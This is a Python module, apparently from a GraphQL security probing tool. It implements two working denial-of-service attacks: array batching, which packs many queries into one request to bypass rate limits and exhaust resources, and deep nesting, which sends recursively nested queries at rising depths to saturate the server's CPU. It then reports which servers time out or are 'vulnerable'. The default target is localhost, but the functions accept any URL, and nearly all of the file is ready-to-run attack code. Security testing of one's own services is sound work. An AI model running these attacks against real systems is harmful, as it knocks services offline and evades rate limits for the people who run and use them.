"""
probe/batch_attack.py
Module 3: GraphQL Batching & Deep Nesting DoS Attacks

Two attack vectors:
  1. ARRAY BATCHING — send a JSON array of N queries in a single HTTP request
     Many GraphQL servers execute all of them, enabling rate-limit bypass
     and resource exhaustion.

  2. DEEP NESTING — craft a single query with recursively nested fields
     to N levels, causing exponential resolver execution and CPU exhaustion.

Both attacks are sent against the real target and timed.
"""

import requests
import time
import json
from typing import Tuple


# ── Attack 1: Array Batching ───────────────────────────────────────────────────

def build_batch_payload(query: str, n: int) -> list:
    """Build a JSON array of n identical queries — the batch attack payload."""
    return [{"query": query} for _ in range(n)]


def run_batching_attack(
    target_url: str,
    batch_size: int = 100,
    timeout: int = 30,
) -> dict:
    """
    Send a batch of `batch_size` queries in a single HTTP request.
    Measures response time to demonstrate resource exhaustion.
    Returns timing + server behaviour data.
    """
    print(f"\n[BATCH ATTACK] Sending array of {batch_size} queries to {target_url}")
    
    simple_query = "{ users { id username email } }"
    payload = build_batch_payload(simple_query, batch_size)
    
    start = time.time()
    try:
        response = requests.post(
            target_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        elapsed = time.time() - start
        
        result = {
            "attack": "array_batching",
            "batch_size": batch_size,
            "status_code": response.status_code,
            "elapsed_seconds": round(elapsed, 3),
            "response_size_bytes": len(response.content),
            "vulnerable": False,
            "blocked": False,
            "message": "",
        }
        
        if response.status_code == 200:
            data = response.json()
            if isinstance(data, list):
                result["vulnerable"] = True
                result["responses_returned"] = len(data)
                result["message"] = (
                    f"SERVER IS VULNERABLE — executed all {len(data)} queries. "
                    f"Response: {result['response_size_bytes']} bytes in {elapsed:.2f}s"
                )
                print(f"[BATCH ATTACK] ✗ VULNERABLE — {len(data)}/{batch_size} queries executed "
                      f"in {elapsed:.2f}s ({result['response_size_bytes']} bytes)")
            else:
                result["blocked"] = True
                result["message"] = "Server rejected batch (returned non-array response)"
                print(f"[BATCH ATTACK] ✓ Batch rejected — server may have protections")
        
        elif response.status_code == 400:
            result["blocked"] = True
            result["message"] = f"Server returned 400 — batch likely blocked"
            print(f"[BATCH ATTACK] ✓ BLOCKED — HTTP 400 in {elapsed:.2f}s")
        else:
            result["message"] = f"Unexpected status {response.status_code}"
            print(f"[BATCH ATTACK] Unexpected response: {response.status_code}")
        
        return result
    
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[BATCH ATTACK] ✗ REQUEST TIMED OUT after {elapsed:.1f}s — possible DoS success")
        return {
            "attack": "array_batching",
            "batch_size": batch_size,
            "elapsed_seconds": elapsed,
            "vulnerable": True,
            "timed_out": True,
            "message": f"Server timed out — potential DoS with batch of {batch_size}",
        }


# ── Attack 2: Deep Nesting ────────────────────────────────────────────────────

def build_nested_query(depth: int, field_name: str = "nested_user") -> str:
    """
    Build a query nested to `depth` levels.
    
    Example at depth=3:
      query {
        nested_user(id: 1) {
          id username
          friend {
            id username
            friend {
              id username
              friend { id username }
            }
          }
        }
      }
    """
    inner = "id username"
    for _ in range(depth):
        inner = f"id username\n    friend {{\n      {inner}\n    }}"
    return f"query DeepNesting {{\n  {field_name}(id: 1) {{\n    {inner}\n  }}\n}}"


def run_nesting_attack(
    target_url: str,
    depths: list = None,
    timeout: int = 30,
) -> list:
    """
    Send queries at increasing depths to find the breaking point.
    Returns list of results per depth.
    """
    if depths is None:
        depths = [2, 5, 10, 20, 50]
    
    print(f"\n[NESTING ATTACK] Testing query depth at levels: {depths}")
    results = []
    
    for depth in depths:
        query = build_nested_query(depth)
        print(f"\n[NESTING ATTACK] Depth {depth:>3} — sending query...")
        
        start = time.time()
        try:
            response = requests.post(
                target_url,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )
            elapsed = time.time() - start
            
            result = {
                "attack": "deep_nesting",
                "depth": depth,
                "status_code": response.status_code,
                "elapsed_seconds": round(elapsed, 3),
                "response_size_bytes": len(response.content),
                "blocked": False,
                "error": None,
            }
            
            try:
                body = response.json()
                if "errors" in body:
                    error_msg = body["errors"][0].get("message", "")
                    if "depth" in error_msg.lower() or "complexity" in error_msg.lower() or "limit" in error_msg.lower():
                        result["blocked"] = True
                        result["error"] = error_msg
                        print(f"[NESTING ATTACK]   ✓ BLOCKED at depth {depth}: {error_msg}")
                    else:
                        print(f"[NESTING ATTACK]   ⚠ GraphQL error at depth {depth}: {error_msg}")
                else:
                    print(f"[NESTING ATTACK]   ✗ SUCCEEDED at depth {depth} — {elapsed:.2f}s | "
                          f"{len(response.content)} bytes")
            except Exception:
                print(f"[NESTING ATTACK]   ✗ Non-JSON response at depth {depth}")
            
            results.append(result)
        
        except requests.exceptions.Timeout:
            elapsed = time.time() - start
            print(f"[NESTING ATTACK]   ✗ TIMED OUT at depth {depth} after {elapsed:.1f}s — DoS!")
            results.append({
                "attack": "deep_nesting",
                "depth": depth,
                "elapsed_seconds": elapsed,
                "timed_out": True,
                "blocked": False,
                "message": "Timeout — server saturated",
            })
            break  # deeper depths will also timeout
    
    return results


def print_attack_summary(batch_result: dict, nesting_results: list):
    """Print formatted summary of all DoS attack results."""
    print("\n" + "="*60)
    print("  DoS / BATCHING ATTACK SUMMARY")
    print("="*60)
    
    print("\n  [ARRAY BATCHING]")
    if batch_result.get("vulnerable"):
        print(f"  🔴 VULNERABLE — {batch_result.get('message', '')}")
    elif batch_result.get("blocked"):
        print(f"  🟢 BLOCKED — {batch_result.get('message', '')}")
    else:
        print(f"  🟡 INCONCLUSIVE — {batch_result.get('message', '')}")
    
    print(f"\n  [DEEP NESTING] Results by depth:")
    print(f"  {'Depth':>8} | {'Status':>12} | {'Time (s)':>10} | {'Bytes':>10}")
    print("  " + "-"*50)
    for r in nesting_results:
        depth = r.get("depth", "?")
        blocked = r.get("blocked", False)
        timeout = r.get("timed_out", False)
        elapsed = r.get("elapsed_seconds", 0)
        size = r.get("response_size_bytes", 0)
        
        if timeout:
            status = "TIMEOUT/DoS"
        elif blocked:
            status = "BLOCKED ✓"
        else:
            status = "VULNERABLE ✗"
        
        print(f"  {depth:>8} | {status:>12} | {elapsed:>10.3f} | {size:>10}")
    
    print("="*60)


if __name__ == "__main__":
    TARGET = "http://localhost:4000/graphql"
    
    batch_result = run_batching_attack(TARGET, batch_size=50)
    nesting_results = run_nesting_attack(TARGET, depths=[2, 5, 10, 20])
    print_attack_summary(batch_result, nesting_results)
